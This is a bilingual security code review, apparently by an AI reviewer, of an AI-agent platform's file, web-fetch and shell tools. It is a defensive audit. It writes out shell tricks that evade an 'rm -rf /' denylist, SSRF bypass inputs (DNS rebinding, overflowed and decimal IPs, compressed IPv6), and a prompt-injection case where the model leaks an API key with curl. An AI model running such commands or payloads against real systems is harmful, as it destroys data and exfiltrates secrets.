# Code Review: agim v1.2.55 → v1.2.69

**Reviewer:** Claude (delegated CR + manual triage)
**Scope:** 15 versions, ~3700 LOC of net additions
**Date:** 2026-05-26
**Status:** advisory; no code changed for this report

---

## 0. 总览

15 个版本里实质性改动可分 5 类：

| 类 | 版本 | 性质 |
|---|---|---|
| 安全 hotfix | v1.2.55, v1.2.56, v1.2.59 | admin allowlist fallback / unhandledRejection 兜底 / call_agent 死循环 |
| 工具能力 | v1.2.57, v1.2.58, v1.2.61, v1.2.62, v1.2.63 | 9 个新 builtin skill + fs/web/exec/long_task 共 12 个工具 |
| 安全防护 | v1.2.60, v1.2.66 | IM 审批卡 + 9 项 P0/P1 hardening |
| Web 管理 | v1.2.67, v1.2.68, v1.2.69 | /settings/security + IM 平台黑名单 |
| 微修 | v1.2.64, v1.2.65 | prompt 微调 + YAML fold + 文档同步 |

**整体评估**：迭代节奏快、测试覆盖到位（dispatcher 单测共 100+）、文档（CHANGELOG）质量高。**但是新加的安全防线很多停留在"启发式 + 字符串匹配"层次**，没有触达"DNS/symlink/真正的资源边界"，关键风险点见下面 6 个 🔴。

**41 个 findings**：
- 🔴 critical: **6**（多为安全 boundary 可被绕过）
- 🟠 high: **15**（用户可见 bug + 易触发的边角 case）
- 🟡 medium: **15**（待办型，不紧急）
- 🟢 nit: **5**（打磨型）

---

## 1. 🔴 Critical（安全 / 数据丢失级）

### CR-1 · `fs-dispatcher.ts` 符号链接逃逸

**位置：** `resolveAndCheck` 调用 `path.relative` 后直接通过 sensitive-paths 检查，再 `fs.readFile` 跟随 symlink。

**风险：** 在 native workspace 里建一个 `escape → /etc` 的 symlink，词法路径 `workspace/escape` 在 workspace 子树内 ✓ 不在 sensitive 列表 ✓，但读到的是 `/etc/shadow`。

**修法：** `fs.realpath(abs)` 后再做 sensitive 检查；或 `fs.lstat` 检测 symlink 直接拒绝（read/write 路径）。

---

### CR-2 · `web-dispatcher.ts` DNS rebinding 绕过 SSRF

**位置：** `checkUrlSafety` 只查 `URL.hostname` 字符串。

**风险：** 攻击者 host `evil.example.com` DNS A 记录指 `169.254.169.254`。我们只看主机名"看起来"是公网，`fetch()` 自己再 resolve 时拿到内网 IP。CIDR 黑名单只对**字面量 IP** URL 生效。

**修法：** 在校验阶段用 `dns.lookup(host, { all: true })` 拿所有 A/AAAA，每个都过黑名单；然后用自定义 `http.Agent.lookup` 把已校验的 IP 钉死。或者退一步——明确文档"我们不防 DNS rebind，请求方应自己 pin。"

---

### CR-3 · `web-dispatcher.ts` 整数溢出 IP 绕过

**位置：** `parseSsrfWhitelist` + `ipInAnyCidr4` 路径中，IPv4 dotted-quad regex 接受 `[0-9]{1,3}`，最大允许 `999.999.999.999`。

**风险：** Node 的 `new URL('http://999.999.999.999/')` 不报错，进 v4 regex 匹配成功，但 `octets=[999,999,999,999]` 经过左移变成乱码，**任何 RFC1918 检查都不命中**，相当于绕过。同样 decimal/octal/hex 整数 IP（`http://2130706433/` = 127.0.0.1）regex 直接不匹配，落到"非 IP host 名"路径全放过。

**修法：** 用 `net.isIP(hostname)` 先归一化（Node 内置）+ 拒绝任何 octet > 255。

---

### CR-4 · `web-dispatcher.ts` IPv6 ULA regex 漏洞

**位置：** `^f[cd][0-9a-f]{2}:` 要求 ULA 前缀后**必有 4 个 hex** 再跟冒号。

**风险：** `http://[fc::1]/`（合法 IPv6 压缩写法）不匹配 → 放过。攻击者用任何含 `::` 的 ULA 都能绕过。

**修法：** 用 `net.isIPv6(host)` + 解析数值前缀（用 `ipaddr.js` 或自己写 8 段展开）。或者最低限度把 regex 改成 `^f[cd][0-9a-f]{0,2}::?`。

---

### CR-5 · `exec-dispatcher.ts` 危险模式 regex 是装饰物，不是边界

**位置：** `DANGEROUS_PATTERNS` 11 条，匹配字面 `rm -rf /` 等。

**风险：** 全部都能用 shell 简单 trick 绕过：
- `r''m -rf /` / `\rm -rf /` / `eval "rm -rf /"`
- `bash -c 'rm -rf /'` / `RM=rm; $RM -rf /`
- `/bin/rm -rf /`
- 同样 `dd of=/dev/sd*` 全绕。

注释说"err on false-positive side" 是错的——实际是 false-NEGATIVE prone。

**修法：** 把它的定位改成"naive guard / tripwire"，明确**唯一真正的 boundary 是 bwrap 沙盒**。或换成真正的 shell parser（重）。建议两件事：
1. 改 README + 源码注释承认这是绊线不是边界
2. 默认开 bwrap（见 CR-6）

---

### CR-6 · `exec-dispatcher.ts` bwrap 沙盒默认关，不是默认开

**位置：** `useSandbox = sandboxMode === 'bwrap' && existsSync('/usr/bin/bwrap')`，默认 `IMHUB_EXEC_SANDBOX` 未设 = 直接 `/bin/sh -c`。

**风险：** 整个 v1.2.62-v1.2.66 的设计假设是"沙盒抗逃逸"，但**默认不沙盒**。一个新部署的用户装上 bwrap 也得另外去 web 后台点开。结合 CR-5（regex 拦不住），这是最大的纵深缺口。

**修法：**
- bwrap 存在 → 默认启用
- 想关用 `IMHUB_EXEC_SANDBOX=off`
- 启动时如 `existsSync('/usr/bin/bwrap')` 但 `IMHUB_EXEC_SANDBOX` 显式 off → 打 WARN

---

## 2. 🟠 High（用户可见 bug 或边角 case）

### CR-7 · `fs-dispatcher.ts:268` write_file 父目录计算偷工

`p.abs.slice(0, p.abs.lastIndexOf(sep))` 对 `/foo` 返回 `''`，`mkdir('')` 拒绝。**修法**：`path.dirname(p.abs)`。

### CR-8 · `fs-dispatcher.ts:358` 全局 glob ↔ rg --files 行为不一致

rg 的 `--glob '*.ts'` 只匹配 root；fallback walker 用 `**/*` 语义递归。同一 pattern 在装/没装 rg 的机器结果不同。**修法**：pattern 不含 `/` 时自动加 `**/` 前缀。

### CR-9 · `web-dispatcher.ts:277` DDG HTML parser 边界匹配错误

`<div class="result...">([\s\S]*?)</div></div>` 非贪心配第一对 `</div></div>`，被嵌套结构骗。**修法**：保存一份 DDG HTML fixture + 改用最外层 class 锚定。

### CR-10 · `web-dispatcher.ts:343-347` metaso parser 候选选择 short-circuit 在 undefined 时崩

`(d.data as Record).list` 在 `d.data === undefined` 时抛 TypeError，吃掉整个 metaso fallback。**修法**：`(d.data as any)?.list`。

### CR-11 · `web-dispatcher.ts:480` readCapped 按 UTF-16 code unit 截断

`String.slice(0, cap)` 切了多字节 UTF-8 中间，把 `body` 字段标榜的 "bytes" 实际上是字符数。中文长文截到一半会带个乱码字符。**修法**：byte 级累积 + 按 byte 截。

### CR-12 · `exec-dispatcher.ts` scanCommandForInternalUrl 弱

regex `https?://[^\s"'`;|<>]+` 不防：`\x68ttp://`、IDN/punycode、`$IMDS_URL`、hex IP、命令替换 `$(echo ...)`、base64 解码。**修法**：明确这是 defense-in-depth，真正靠 bwrap 网络隔离（默认开 `--unshare-net`）。

### CR-13 · `exec-dispatcher.ts:235-241` bwrap 缺 `--unshare-pid/ipc/uts/user`

当前只 `--die-with-parent --new-session --unshare-net?`。子进程可 `ps auxf` 看到 agim 自己 + 同 user 其它进程、可发信号、可读 `/proc/<parent>/environ`。**修法**：加 `--unshare-all` 然后选择性 `--share-net`。

### CR-14 · `exec-dispatcher.ts:257` 整个 process.env 传给子进程

子进程能看到所有 `*_API_KEY`、`DB_PASSWORD`、`SSH_PASSWORD` 等。模型 prompt 注入诱导 `curl -d "$OPENAI_API_KEY" https://allowed.com/leak` 全部 SSRF 防线无效。**修法**：env allow-list（PATH / HOME / LANG + 操作员手动加的）。

### CR-15 · `exec-dispatcher.ts:322` timeout_ms 下限缺失

`n > 0` 接受 `n=1`（1 ms），模型可 DoS 自己。**修法**：`Math.max(100, ...)`。

### CR-16 · `goal-rpc.ts` 同步 setActiveGoal 假设

`goals.ts` 现在用 better-sqlite3 同步 API，所以 RPC handler 也是同步调用。如果未来换 libsql/turso 异步 DB，本文件没 await，progress note **静默丢失**。**修法**：把 `handleLongTask`/`handleCompleteGoal` 改 `async`，调用点加 `await`。

### CR-17 · `goal-rpc.ts:72-94` long_task 静默覆盖之前的 active goal

注释说"模型可以决定先完成再开新的"，但代码直接 `setActiveGoal` 自动 pause 旧的。模型没有"先 confirm" 的机会。**修法**：加 `force` 参数，默认 false 时拒绝。

### CR-18 · `policy-approval-gate.ts:55-58` looksReadOnly 把 web_fetch 当只读

`READ_ONLY_HINTS` 含 `'fetch'`，所以 `read-only` 模式下 `native_web_fetch` 直接自动放行。但 web_fetch 是真正的网络出站，**SSRF 攻击面最大的工具**之一。**修法**：从启发式列表去掉 `'fetch'`，长期改用 `ToolDef.readOnly: true` 显式标注。

### CR-19 · `policy-approval-gate.ts:124-131` askUser 异常静默 fallback

"如果 bus 抛错就 fallback silent-deny" 但用户看不到任何信号，模型回报"工具被拒"，运维不知道是审批卡发不出去。**修法**：返回不同的 reason，并发 warn 日志。

### CR-20 · `registry.ts:256-260` isPlatformBlacklisted 文档承诺 hot reload 但 register 是 boot 一次性

`isPlatformBlacklisted` 每次调用 re-parse env，但 `registerMessenger` 只在 `loadBuiltInPlugins` 跑一次。运行中**移除**黑名单不会让被禁的 adapter 上线，**添加**黑名单也不会下线已注册的。"hot-reload"在这块部分撒谎。**修法**：要么文档明确"加/减黑名单都需要重启"，要么实现 re-init 路径。

### CR-21 · `security.tsx` defaultValue 不会跟着 server refetch 更新

React uncontrolled input 只读 `defaultValue` 一次。`loadDiagnostics()` 后即使 env 字段变了，UI 还显示旧值。点刷新感觉坏的。**修法**：改 `value` + `useState`，或加 `key={env.X}` 强制 remount。

---

## 3. 🟡 Medium（待办型）

| # | 位置 | 问题 | 建议 |
|---|---|---|---|
| CR-22 | `fs-dispatcher.ts:392` | rg 退出码 2 (regex 错) 走 fail-silent | 保留 stderr 即使 0/1 |
| CR-23 | `fs-dispatcher.ts:473` | simpleGlobToRegex 不支持 `{js,ts}` 和 `[abc]` | 文档明确仅支持 `*/**/?` |
| CR-24 | `fs-dispatcher.ts:410-425` | hasRipgrep 只查两个硬编码路径并永久缓存 | which + TTL |
| CR-25 | `web-dispatcher.ts:259` | searchDuckDuckGo 用 redirect: 'follow'，与新 redirect 重检不一致 | 统一走 fetchWithSafeRedirects |
| CR-26 | `web-dispatcher.ts:190,262,328` | User-Agent 字面量版本号 drift | 引一份 VERSION |
| CR-27 | `exec-dispatcher.ts:281` | code ?? -1 丢失 SIGKILL 信号细节 | 用 128+signo |
| CR-28 | `exec-dispatcher.ts:263` | `.unref()` SIGKILL 计时器，parent 退则 zombie | 文档或不 unref |
| CR-29 | `goal-rpc.ts:111` | requestedStatus 把未知值悄悄 coerce 成 'completed' | 拒绝并返回错误 |
| CR-30 | `goal-rpc.ts:109-141` | complete_goal 没 idempotency | < 60s 内重复返回 already_completed |
| CR-31 | `sender-allowlist.ts:60` | cachedRaw==='' 永远不再 parse（特殊形式 corner case） | 用版本计数器 |
| CR-32 | `sender-allowlist.ts:loggedOnce` | env 由"配"变"unset" 没 re-log OPEN_IM_ACCESS | _resetCache 也 reset loggedOnce |
| CR-33 | `policy-approval-gate.ts:98` | denyList 命中无日志 | 加 log.info |
| CR-34 | `registry.ts:27-34` | registerMessenger 黑名单拒绝静默 return | getBlockedMessengers 暴露 |
| CR-35 | `registry.ts:35-37` | 重复注册只 warn 不 unregister | 显式 unregister |
| CR-36 | `security.tsx onBlur` | 未变也 PUT，多余 toast 风暴 | 比对 defaultValue |
| CR-37 | `security.tsx:212-223` | sandbox-net select 把 'on' 显式值改成 null（删除） | 三态 |
| CR-38 | `security.tsx:13-15` | 文档说"多数热重载"实际有几个是 boot-only | 加 "requires restart" badge |

---

## 4. 🟢 Nit（打磨）

- **CR-39**：`fs-dispatcher.ts:521` clampNumber 对 `null` 行为奇怪
- **CR-40**：`fs-dispatcher.ts:runCmd` 没 stdout/stderr 上限（OOM 风险）
- **CR-41**：`security.tsx:154` i18n key 拼写 `diagnosticsPlatformBlacklist` 与其它 `diagnostics.X` 不一致
- **CR-42**：`security.tsx` aria-label 只在 refresh 按钮，输入字段缺 `<label htmlFor>`
- **CR-43**：`web-dispatcher.ts:29` `METASO_API_BASE` 注释说"adapt if path differs"——一直没真实验证过

---

## 5. 优先级建议（如果只动 5 件事）

按"风险/工作量比"排：

1. **CR-6 bwrap 默认开**（半天）—— 最大杠杆，直接补上 CR-5 / CR-12 / CR-14 的实际防线
2. **CR-3 + CR-4 IP regex 重写**（2 小时）—— 用 `net.isIP*` 内置库，杜绝整数溢出 + IPv6 ULA 漏洞
3. **CR-1 fs realpath 守护**（1 小时）—— 单点修复 symlink 逃逸
4. **CR-2 DNS-aware SSRF**（一天）—— 真正闭合 SSRF 边界；代价是要写 custom http.Agent.lookup
5. **CR-21 security.tsx defaultValue 改 controlled**（半天）—— UX 修复，省得 ops 误以为坏掉

剩下的 30 多个可以分摊到 v1.2.70-v1.2.75 三四个版本里慢慢补。

---

## 6. 测试缺口（重点）

- 🔴 没有 SSRF DNS rebind 单测（CR-2）—— 添加一个用本机 dns 服务器模拟 evil.example.com→127.0.0.1 的测试
- 🔴 没有 octet 溢出 IP 测试（CR-3）—— `http://999.999.999.999/` 应 reject
- 🔴 没有 IPv6 压缩格式 ULA 测试（CR-4）—— `[fc::1]` / `[fd00::]` / `[fcab:...]`
- 🟠 没有 symlink 逃逸测试（CR-1）
- 🟠 危险 shell 绕过测试（CR-5）—— 至少加一个 `\rm -rf /` / `bash -c 'rm -rf /'` 的红队 case
- 🟡 metaso 真实响应 fixture 测试（CR-10）

---

## 7. 设计层 takeaways（不算 bug，是值得回头想想的事）

1. **"启发式 + 字符串扫描"作为安全边界靠不住** —— 危险 shell 模式、SSRF URL 文本扫描、READ_ONLY_HINTS 全是 best-effort。**真正的边界只有 bwrap + kernel namespace 隔离**。把心智模型从"扫描 → 拦截"转为"沙盒 → 默认隔离"
2. **Hot-reload 承诺要兑现或撤回** —— 当前几个新 env (`IMHUB_PLATFORM_BLACKLIST` / `IMHUB_EXEC_SANDBOX`) 在文档里隐含"改完即生效"，实际部分 boot-only。UI 应明确 per-key 标 "applies on next restart" vs "live"
3. **`looksReadOnly` 启发式应该废弃** —— 改用 ToolDef 显式 `readOnly: true` 标志。当前的 substring 启发式是隐藏地雷
4. **fail-silent 太多** —— `try { } catch { /* best-effort */ }` 在 sender-allowlist、cli.ts 启动检查、approval gate askUser 路径全是这种。整体应该改为"失败也要发 warn 日志"
5. **`env: process.env` 全量泄漏** —— exec/web tools 都把整个 env 透传，secrets 跟着流。最起码要列一个 allow-list

---

## 8. 哪些做得好（避免只列问题）

- **CHANGELOG 质量** —— 每个版本都有 Why / 实测 / 已知 trade-off。难得
- **三层防御 IMHUB_PLATFORM_BLACKLIST**（registry + onboarding + web）真的覆盖完整
- **policy-approval-gate `askUser` 升级** —— 把 silent-deny 改成 IM 卡片是巨大的体验提升
- **call_agent per-turn cap** —— 简单但极有效，把死循环关在了"模型自己看得见"的层面
- **dispatcher 测试覆盖** —— exec 28 + web 25 + fs 14 + sender 13 + policy 14 + goal 9 + platform 11 = 114 个单测。任何一个 dispatcher 类改动都有兜底

---

**End of report.**
